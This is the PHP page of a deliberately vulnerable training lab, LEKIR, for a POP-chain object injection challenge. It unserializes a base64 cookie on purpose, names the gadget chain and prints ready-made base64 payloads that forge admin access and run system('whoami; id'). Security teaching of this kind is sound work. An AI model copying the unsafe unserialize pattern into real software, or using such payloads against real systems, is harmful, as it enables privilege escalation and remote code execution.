<?php
// Determine the base path based on current directory depth
$current_path = $_SERVER['PHP_SELF'];
$base_path = './';
if (strpos($current_path, '/vulnerabilities/') !== false) {
    $parts = explode('/vulnerabilities/', $current_path);
    if (isset($parts[1]) && strpos($parts[1], '/') !== false) {
        $base_path = '../../';
    } else {
        $base_path = '../';
    }
} elseif (strpos($current_path, '/tools/') !== false || strpos($current_path, '/compare/') !== false || strpos($current_path, '/components/') !== false) {
    $base_path = '../';
}

session_start();
include($base_path . 'core/configuration.php');
include($base_path . "core/function.php");
require "serialize/SecondClass.php";
require "serialize/ThirdClass.php";

$session = new Session();
$session->check_invalid_session();

$secure = new Secure();
$level = new Level();

ini_set("display_errors", 0);
error_reporting(0);

$authenticated = false;
$userInfo = "";
$isAdmin = false;

if (isset($_COOKIE['site_login'])) {
    try {
        $cookie_data = base64_decode($_COOKIE['site_login']);
        $user_obj = unserialize($cookie_data);
        
        if ($user_obj instanceof Second) {
            $authenticated = true;
            $userInfo = $user_obj->getUserInfo();
            $isAdmin = $user_obj->authenticate();
        }
        
        if (isset($user_obj)){
            unset($user_obj->data);
        }

    } catch (Exception $e) {
        setcookie('site_login', '', time() - 3600, '/');
    }
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === 'guest' && $_POST['password'] === 'guest') {
        $user = new Second('guest', 'user');
        $serialized = serialize($user);
        $cookie_value = base64_encode($serialized);
        setcookie('site_login', $cookie_value, time() + 3600, '/');
        header('Location: deserialize2.php');
        exit();
    }
}

if (isset($_GET['logout'])) {
    setcookie('site_login', '', time() - 3600, '/');
    header('Location: deserialize2.php');
    exit();
}
?>
<!doctype html>
<!--
* LEKIR - Vulnerable by design to learn common web vulnerability
* Learning Environment for Cybersecurity through Immersive Real-world scenarios
* By Firdaus Khairuddin
-->
<html lang='en'>
  <head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <title><?php echo htmlentities($title); ?></title>
    <link rel="icon" href="<?php echo $base_path; ?>static/lekir.jpeg" type="image/png">
    <!-- CSS files -->
    <link href="<?php echo $base_path; ?>dist/css/tabler.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/tabler-flags.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/tabler-payments.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/tabler-vendors.min.css?1684106062" rel="stylesheet"/>
    <link href="<?php echo $base_path; ?>dist/css/demo.min.css?1684106062" rel="stylesheet"/>
    <style>
      @import url("https://rsms.me/inter/inter.css");
      :root {
      	--tblr-font-sans-serif: 'Inter Var', -apple-system, BlinkMacSystemFont, San Francisco, Segoe UI, Roboto, Helvetica Neue, sans-serif;
      }
      body {
      	font-feature-settings: 'cv03', "cv04", "cv11";
      }
      .code-block {
          background: #2d2d2d;
          color: #f8f8f2;
          padding: 15px;
          border-radius: 8px;
          font-family: 'Courier New', monospace;
          overflow-x: auto;
          margin: 10px 0;
      }
    </style>
  </head>
  <body >
    <script src="<?php echo $base_path; ?>dist/js/demo-theme.min.js?1684106062"></script>
    <div class="page">
      <!-- Navbar -->
      <?php include($base_path . "components/top_navbar.php"); ?>
      <?php include($base_path . "components/header.php"); ?>
 
      <div class="page-body">
          <div class="container-xl">
            <div class="row row-cards">

              <div class="col-lg-4">
                <div class="card">
                  <div class="card-body">
                    <div class="d-flex align-items-center mb-3">
                      <div class="me-3">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user-shield" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 21v-2a4 4 0 0 1 4 -4h2" /><path d="M22 16c0 4 -2.5 6 -2.5 6s-2.5 -2 -2.5 -6c0 -3 2 -5 2.5 -5s2.5 2 2.5 5z" /><path d="M8 7a4 4 0 1 0 8 0a4 4 0 0 0 -8 0" /></svg>
                      </div>
                      <div>
                        <small class="text-muted">Information</small>
                        <h3 class="lh-1">POP Chain Deserialization</h3>
                      </div>
                    </div>
                    <ul class="list-unstyled space-y-1">
                      <li><b>Level</b> : <font style="color:red;"><b>High</b></font></li>
                      <li><b>Short Form</b> : POP CHAIN</li>
                      <li><b>Injection Point</b> : Cookie: <code>site_login</code></li>
                      <li><b>Why this happen</b> : This challenge demonstrates a Property Oriented Programming (POP) chain. By injecting a malicious serialized object into the cookie, an attacker can chain together existing "gadget" classes to achieve Remote Code Execution (RCE).</li>
                      <li><b>Author</b> : EagleTube</li>
                      <li><b>Read More</b> : <a href='https://firdauskhairuddin.gitbook.io/common-web-vulnerability-php/php-object-injection' target='_blank'>Link</a></li>
                    </ul>   
                  </div>
                </div>

                <div class="card mt-3">
                    <div class="card-body">
                        <h4 class="card-title">Challenge Hints</h4>
                        <div class="vulnerability-info">
                            <p><strong>Vulnerable Flow:</strong></p>
                            <ol class="small">
                                <li><code>base64_decode($_COOKIE['site_login'])</code></li>
                                <li><code>unserialize($cookie_data)</code></li>
                                <li><code>unset($user_obj->data)</code> triggers exploit</li>
                            </ol>
                            <p><strong>Gadgets:</strong></p>
                            <ul class="small">
                                <li><code>Second::__unset()</code></li>
                                <li><code>Third::__call()</code></li>
                                <li><code>Second::execute()</code></li>
                            </ul>
                        </div>
                    </div>
                </div>
              </div>

              <div class="col-lg-8">
                <div class="card card-lg">
                  <div class="card-body">
                        <div class="markdown">
                        <?php if (!$authenticated): ?>
                            <h3 class="lh-1">Login Required</h3>
                            <p>Please login to access the admin dashboard. Try using the guest credentials provided below.</p>

                            <div class="row g-2 align-items-center mb-4">
                                <form role="form" action="" method="POST" >
                                    <div class="mb-3">
                                        <label class="form-label">Username</label>
                                        <input type="text" class="form-control" name="username" placeholder="guest" required>
                                    </div>
                                    <div class="mb-3">
                                        <label class="form-label">Password</label>
                                        <input type="password" class="form-control" name="password" placeholder="guest" required>
                                    </div>
                                    <center><button action="submit" class="btn btn-primary">
                                        Login
                                    </button>
                                    </center> 
                                </form> 
                            </div>

                            <div class="alert alert-info">
                                <strong>Hint:</strong> Try username: <code>guest</code>, password: <code>guest</code>
                            </div>

                        <?php else: ?>
                            <div class="d-flex justify-content-between align-items-center">
                                <h3 class="lh-1">Admin Dashboard</h3>
                                <a href="?logout=1" class="btn btn-outline-danger btn-sm">Logout</a>
                            </div>
                            
                            <div class="mt-4 text-center">
                                <h2>Welcome to the Dashboard</h2>
                                <div class="p-3 bg-light rounded mb-3">
                                    <h4 class="mb-1"><?php echo $userInfo; ?></h4>
                                    <span class="badge <?php echo $isAdmin ? 'bg-danger' : 'bg-success'; ?>">
                                        <?php echo $isAdmin ? 'ADMIN' : 'USER'; ?>
                                    </span>
                                </div>

                                <?php if ($isAdmin): ?>
                                    <div class="alert alert-success">
                                        🎉 <strong>Congratulations!</strong> You have admin access!
                                        <br>Can you take it further and achieve RCE?
                                    </div>
                                <?php else: ?>
                                    <div class="alert alert-warning">
                                        <strong>Goal:</strong> You're logged in as a regular user. Escalate to admin privileges by exploiting the PHP object injection vulnerability in the cookie.
                                    </div>
                                <?php endif; ?>
                            </div>

                            <div class="mt-4 shadow-sm border rounded p-3">
                                <h4>🛠️ Exploit Examples (Base64 for cookie)</h4>
                                <div class="mb-3">
                                    <strong>1. Become Admin:</strong>
                                    <div class="card bg-dark text-light p-2 small mt-1">
                                        <code class="text-info" style="word-break: break-all;">Tzo2OiJTZWNvbmQiOjY6e3M6MTI6IgBTZWNvbmQAZGF0YSI7YTowOnt9czoxNjoiAFNlY29uZAB1c2VydHlwZSI7czo1OiJhZG1pbiI7czoxNjoiAFNlY29uZAB1c2VybmFtZSI7czo2OiJoYWNrZXIiO3M6MTM6IgBTZWNvbmQAX2Z1bmMiO3M6NzoicHJpbnRfciI7czo2OiJtZW1iZXIiO3M6NDoiZGF0YSI7czo2OiJtZXRob2QiO3M6NzoiZGVzdHJveSI7fQ==</code>
                                    </div>
                                </div>
                                <div>
                                    <strong>2. Execute Command (RCE):</strong>
                                    <div class="card bg-dark text-light p-2 small mt-1">
                                        <code class="text-info" style="word-break: break-all;">Tzo2OiJTZWNvbmQiOjY6e3M6MTI6IgBTZWNvbmQAZGF0YSI7YToxOntzOjQ6ImRhdGEiO086NToiVGhpcmQiOjI6e3M6NDoiZGF0YSI7YTowOnt9czozOiJvYmoiO086NjoiU2Vjb25kIjo2OntzOjEyOiIAU2Vjb25kAGRhdGEiO2E6MDp7fXM6MTY6IgBTZWNvbmQAdXNlcnR5cGUiO3M6NDoidXNlciI7czoxNjoiAFNlY29uZAB1c2VybmFtZSI7czo1OiJndWVzdCI7czoxMzoiAFNlY29uZABfZnVuYyI7czo2OiJzeXN0ZW0iO3M6NjoibWVtYmVyIjtzOjA6IiI7czo2OiJtZXRob2QiO3M6MDoiIjt9fX1zOjE2OiIAU2Vjb25kAHVzZXJ0eXBlIjtzOjU6ImFkbWluIjtzOjE2OiIAU2Vjb25kAHVzZXJuYW1lIjtzOjY6ImhhY2tlciI7czoxMzoiAFNlY29uZABfZnVuYyI7czo2OiJzeXN0ZW0iO3M6NjoibWVtYmVyIjtzOjEwOiJ3aG9hbWk7IGlkIjtzOjY6Im1ldGhvZCI7czo3OiJleGVjdXRlIjt9</code>
                                    </div>
                                </div>
                                <p class="small text-muted mt-2">Replace the <code>site_login</code> cookie value in your browser dev tools.</p>
                            </div>
                        <?php endif; ?>

                        <div class="mt-4 p-3 bg-blue-lt rounded border border-blue small">
                            <h4>💡 Educational Hint</h4>
                            <p>Private properties use null bytes in serialization: <code>\00ClassName\00propertyName</code>. When crafting your payload, ensure these are preserved.</p>
                        </div>

                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

      <?php include($base_path . "components/footer.php");?>

    </div>
    <!-- Libs JS -->
    <script src="<?php echo $base_path; ?>dist/js/tabler.min.js?1684106062" defer></script>
    <script src="<?php echo $base_path; ?>dist/js/demo.min.js?1684106062" defer></script>
  </body>
</html>